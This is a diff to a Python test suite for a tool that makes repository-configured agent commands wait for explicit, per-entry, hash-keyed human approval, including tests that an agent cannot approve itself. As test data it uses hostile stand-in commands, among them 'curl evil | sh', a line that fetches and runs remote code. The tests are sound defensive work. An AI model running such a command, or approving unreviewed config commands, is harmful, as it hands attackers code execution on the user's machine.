@@ -163,7 +163,9 @@ def test_committed_command_waits_for_approval(proj, new_ticket):
     assert config.agent_entries(proj) == {}
     assert config.agent_name(proj) is None
     assert adapters.chosen(proj) == "claude"  # the person's own default
-    assert config.pending_agents(proj) == [{"name": "mine", "command": "touch PWNED {prompt}"}]
+    pend = config.pending_agents(proj)
+    assert len(pend) == 1 and pend[0]["name"] == "mine" and pend[0]["command"] == "touch PWNED {prompt}"
+    assert pend[0]["showable"] and len(pend[0]["key"]) == 64
     assert "asks to run" in adapters.command_notice("claude", "oneshot", proj)
     not_run(proj, new_ticket())
 
@@ -202,7 +204,8 @@ def test_a_symlinked_orch_folder_is_not_run(proj, new_ticket, tmp_path_factory):
 
 def test_approved_runs_and_a_changed_command_asks_again(proj, run):
     write_config(proj, EVIL, commit=True)
-    assert run("private", "allow")[0] == 0
+    p = config.pending_agents(proj)[0]
+    assert run("private", "allow", "mine", "--key", p["key"])[0] == 0
     assert config.pending_agents(proj) == []
     assert adapters.chosen(proj) == "mine"
     assert adapters.load("mine", proj)["command"] == "touch PWNED {prompt}"
@@ -213,7 +216,7 @@ def test_approved_runs_and_a_changed_command_asks_again(proj, run):
 
 def test_approval_is_per_workspace(proj, tmp_path_factory):
     write_config(proj, EVIL)
-    config.allow_agent(proj)
+    config.allow_agent(proj, "mine", config.pending_agents(proj)[0]["key"])
     other = tmp_path_factory.mktemp("ws2")
     (other / ".orch").mkdir()
     (other / ".orch" / "config.toml").write_text(EVIL)
@@ -222,7 +225,7 @@ def test_approval_is_per_workspace(proj, tmp_path_factory):
 
 def test_a_broken_approvals_file_fails_closed(proj):
     write_config(proj, EVIL)
-    config.allow_agent(proj)
+    config.allow_agent(proj, "mine", config.pending_agents(proj)[0]["key"])
     config._approvals_path().write_text("not json")
     assert config.agent_entries(proj) == {}
 
@@ -230,7 +233,7 @@ def test_a_broken_approvals_file_fails_closed(proj):
 def test_an_agent_cannot_allow_or_self_approve(proj, run, monkeypatch):
     write_config(proj, EVIL)
     monkeypatch.setenv("CLAUDECODE", "1")
-    assert run("private", "allow")[0] == 2
+    assert run("private", "allow", "mine", "--key", config.pending_agents(proj)[0]["key"])[0] == 2
     assert run("config", "agent", "add", "sneaky", "--command", "touch X {prompt}")[0] == 0
     assert "sneaky" not in config.agent_entries(proj)
     assert any(p["name"] == "sneaky" for p in config.pending_agents(proj))
@@ -245,4 +248,49 @@ def test_the_line_says_what_waits(proj, run):
     write_config(proj, EVIL, commit=True)
     out = run("private")[1]
     assert "asks to run" in out and "Allow on this machine" in out
+    assert "touch PWNED {prompt}" in out and "adapter: generic" in out and "--key" in out
     assert "Allow on this machine" in run("status")[1]
+
+
+TWO = EVIL + '\n[agents.other]\nadapter = "generic"\ncommand = "touch OTHER {prompt}"\ninteractive = "other --live"\n'
+
+
+def test_no_blanket_approval_one_yes_approves_one_entry(proj, run):
+    write_config(proj, TWO)
+    pend = {p["name"]: p for p in config.pending_agents(proj)}
+    assert set(pend) == {"mine", "other"}
+    assert run("private", "allow")[0] != 0  # no name, no key: nothing
+    assert run("private", "allow", "mine")[0] != 0  # no key
+    assert config.agent_entries(proj) == {}
+    assert run("private", "allow", "mine", "--key", pend["mine"]["key"])[0] == 0
+    assert set(config.agent_entries(proj)) == {"mine"}
+    assert [p["name"] for p in config.pending_agents(proj)] == ["other"]
+    assert run("private", "allow", "other", "--key", pend["mine"]["key"])[0] != 0  # another entry's key
+
+
+def test_an_entry_changed_after_it_was_shown_is_refused(proj, run):
+    write_config(proj, EVIL)
+    shown = config.pending_agents(proj)[0]
+    write_config(proj, EVIL.replace("touch PWNED", "curl evil | sh"))
+    code, out, err = run("private", "allow", "mine", "--key", shown["key"])
+    assert code != 0 and "changed" in (out + err)
+    assert config.agent_entries(proj) == {}
+    # an interactive or prompt change alone also changes the key
+    write_config(proj, EVIL + 'interactive = "x --live"\n')
+    assert config.pending_agents(proj)[0]["key"] != shown["key"]
+
+
+def test_the_listing_covers_every_hashed_field(proj):
+    write_config(proj, EVIL + 'interactive = "x --live"\nprompt = "stdin"\n')
+    p = config.pending_agents(proj)[0]
+    assert (p["adapter"], p["command"], p["interactive"], p["prompt"]) == (
+        "generic", "touch PWNED {prompt}", "x --live", "stdin")
+
+
+def test_an_entry_too_long_to_show_cannot_be_allowed(proj):
+    write_config(proj, EVIL.replace("touch PWNED {prompt}", "touch " + "a" * 600 + " {prompt}"))
+    p = config.pending_agents(proj)[0]
+    assert p["showable"] is False
+    with pytest.raises(Refused):
+        config.allow_agent(proj, "mine", p["key"])
+    assert config.agent_entries(proj) == {}
